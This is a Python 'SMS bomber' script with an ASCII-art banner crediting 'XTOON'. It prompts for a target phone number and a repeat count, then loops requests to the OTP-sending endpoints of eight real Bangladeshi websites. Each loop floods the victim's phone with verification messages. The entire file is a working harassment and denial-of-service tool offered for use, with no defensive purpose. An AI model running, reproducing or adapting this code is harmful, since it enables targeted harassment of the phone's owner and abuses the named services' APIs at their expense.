import requests as rq
import os
import random
BLACK = "\033[0;30m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BROWN = "\033[0;33m"
BLUE = "\033[0;34m"
PURPLE = "\033[0;35m"
CYAN = "\033[0;36m"
LIGHT_GRAY = "\033[0;37m"
DARK_GRAY = "\033[1;30m"
LIGHT_RED = "\033[1;31m"
LIGHT_GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
LIGHT_BLUE = "\033[1;34m"
LIGHT_PURPLE = "\033[1;35m"
LIGHT_CYAN = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
BOLD = "\033[1m"
FAINT = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
BLINK = "\033[5m"
NEGATIVE = "\033[7m"
CROSSED = "\033[9m"
end = "\033[0m"
clr= RED,GREEN,BLUE,YELLOW
color=random.choice(clr)

logo = f"""
       {color} ██╗  ██╗████████╗███╗   ██╗{color}
      {color}  ╚██╗██╔╝╚══██╔══╝████╗  ██║{color}
         ╚███╔╝    ██║   ██╔██╗ ██║
         ██╔██╗    ██║   ██║╚██╗██║
        ██╔╝ ██╗   ██║   ██║ ╚████║
        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝{end}
              {GREEN} AUTHOR : {BOLD}XTOON{end}
......{ITALIC}IF YOU SENT 1 MASSEGE IT'S MEAN 8{end}.....
--------------------------------------------
"""
os.system("clear")
print(logo)
Number = input(f"{LIGHT_BLUE}Enter Your Target Number :{GREEN} {end}")
amount = int(input(f"{YELLOW}ENTER YOUR LIMIT :{GREEN} {end}"))
url1 = 'https://api.osudpotro.com/api/v1/users/send_otp'
data1 = {"mobile": f"+88-{Number}", "deviceToken": "web", "language": "en", "os": "web"}
url2 = 'https://api.osudkini.com/api/otp/generate-otp'
data2 = {"phoneNo": f"{Number}"}
url3= 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+Number
url4 = "https://developer.medha.info/api/send-otp"
data4 = {"phone": f"{Number}","is_register": "1"}
url5 = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=120.0.0.0&os=Android&osv=10&refPartner="
data5 = {
"mobile":f"88{Number}"
}
url6 = "https://meenabazardev.com/api/front/send/otp"
data6 = {"CellPhone":f"{Number}","type":"login"}
url7 = f"https://www.rokomari.com/otp/send?emailOrPhone=88{Number}&countryCode=BD"
url8 = "https://api.apex4u.com/api/auth/login"
data8 = {"phoneNumber":f"{Number}"}
os.system("clear")
print(f"""  {color}      ██╗  ██╗████████╗███╗   ██╗
       ╚██╗██╔╝╚══██╔══╝████╗  ██║
         ╚███╔╝    ██║   ██╔██╗ ██║
         ██╔██╗    ██║   ██║╚██╗██║
        ██╔╝ ██╗   ██║   ██║ ╚████║
        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝{end}
{GREEN}--------------------------------------------{RED}
""")
for i in range(amount):
    res2 = rq.get(url3)
    if res2.json()['otp_length']==6:
        print(f" {GREEN} SMS SENT FROM BIKROY.COM{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res1 = rq.post(url2, json=data2)
    if res1.json()['success']==True:
        print(f" {GREEN} SMS SENT FROM OSUDKINI{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res3 = rq.post(url1, json=data1)
    if res3.json()['status']==False:
        print(f" {GREEN} SMS SENT FROM OSUDPOTRO{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res4 = rq.post(url4,json=data4)
    if res4.json()["success"]==True:
        print(f" {GREEN} SMS SENT FROM MEDHA{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res5 = rq.post(url5,data=data5)
    if res5.json()["status"]=="success":
        print(f"  {GREEN}SMS SENT FROM AROGGA{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res6 = rq.post(url6,json=data6)
    if res6.status_code == 200 or 201:
        print(f" {GREEN} SMS SENT FROM MEENA BAZAR{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res7 = rq.post(url7)
    if res7.status_code == 200:
        print(f" {GREEN} SMS SENT FROM ROKOMARI{end} ")
    else:
        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
    res8 = rq.post(url8)
    if res8.status_code == 200:
        print(f" {GREEN} SMS SENT FROM APEX{end} ")
    else:
        print(f"{RED}  NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
